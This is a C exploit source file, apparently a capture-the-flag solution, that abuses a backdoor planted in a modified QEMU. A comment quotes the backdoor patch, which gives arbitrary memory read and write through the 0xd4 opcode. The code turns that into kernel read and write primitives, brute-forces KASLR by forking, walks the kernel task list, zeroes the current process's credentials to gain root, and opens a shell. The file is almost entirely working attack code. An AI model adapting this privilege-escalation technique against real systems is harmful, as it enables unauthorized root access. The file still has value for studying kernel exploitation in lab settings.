// gcc exploit.c -static -s -masm=intel -o exploit
// based of an exploit from mementomori


/**
qemu has a had a backdoor added allowing arbitary read/write when executing aam (0xd4) if the correct
values have been setup in r11-13.

+static void __attribute__ ((noinline)) pbctf_this_is_not_a_backdoor_we_promise(DisasContext *s) {
+    TCGLabel *backdoor_label1 = gen_new_label();
+    TCGLabel *backdoor_label2 = gen_new_label();
+    tcg_gen_movi_tl(s->tmp0, 0x1337133713371337);
+    tcg_gen_brcond_tl(TCG_COND_NE, s->tmp0, cpu_regs[R_R11], backdoor_label1);
+    tcg_gen_qemu_st64(cpu_regs[R_R12], cpu_regs[R_R13], 0);
+
+    gen_set_label(backdoor_label1);
+
+    tcg_gen_movi_tl(s->tmp0, 0x7331733173317331);
+    tcg_gen_brcond_tl(TCG_COND_NE, s->tmp0, cpu_regs[R_R11], backdoor_label2);
+    tcg_gen_qemu_ld64(cpu_regs[R_R12], cpu_regs[R_R13], 0);
+
+    gen_set_label(backdoor_label2);
+}
**/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <wait.h>

#define INIT_TASK 0xffffffff81c114c0
#define TASKS_OFFSET 0x260
#define PID_OFFSET 0x360
#define CRED_OFFSET 0x500
#define COMM_OFFSET 0x508

uint64_t arb_read(uint64_t addr)
{
    uint64_t value = 0;
    asm(
        "mov rax, 0x7331733173317331;"
        "mov r11, rax;"
        "mov r13, %1;"
        ".byte 0xd4;"
        "mov %0, r12;"
        : "=r"(value)
        : "r"(addr)
        : "rax", "r11", "r12", "r13");
    return value;
}

void arb_write(uint64_t addr, uint64_t value)
{
    asm(
        "mov rax, 0x1337133713371337;"
        "mov r11, rax;"
        "mov r12, %1;"
        "mov r13, %0;"
        ".byte 0xd4;"
        :
        : "r"(addr), "r"(value)
        : "rax", "r11", "r12", "r13");
}

int main(int argc, char *argv[])
{
    int i, s;

    // fork kaslr bruteforce
    for (i = 0; i < 1024; i++)
    {
        if (fork() == 0)
            break;
        wait(&s);
        if (WEXITSTATUS(s) == 1)
            return 0;
    }

    uint64_t kaslr_offset = i << 20;
    uint64_t init_task = kaslr_offset + INIT_TASK;

    printf("[~] trying %p ...\n", (void *)init_task);

    // "swapper/" signature check
    if (arb_read(init_task + COMM_OFFSET) != 0x2f72657070617773)
        return 0;

    printf("[+] init_task @ %p\n", (void *)init_task);

    // walk init_task->tasks->prev
    uint64_t task;
    for (task = init_task; (task = arb_read(task + TASKS_OFFSET + 8) - TASKS_OFFSET) != init_task;)
    {
        pid_t task_pid = arb_read(task + PID_OFFSET) & (1ULL << 32) - 1;
        if (task_pid == getpid())
        {
            printf("[+] found current task!\n");

            uint64_t cred = arb_read(task + CRED_OFFSET);
            printf("[~] overwriting cred @ %p\n", (void *)cred);

            for (i = 0; i < 4; i++)
            {
                arb_write(cred + 8 * i, 0);
            }

            printf("[+] uid = %d\n", getuid());
            system("/bin/sh");
            return 1;
        }
    }
    return 0;
}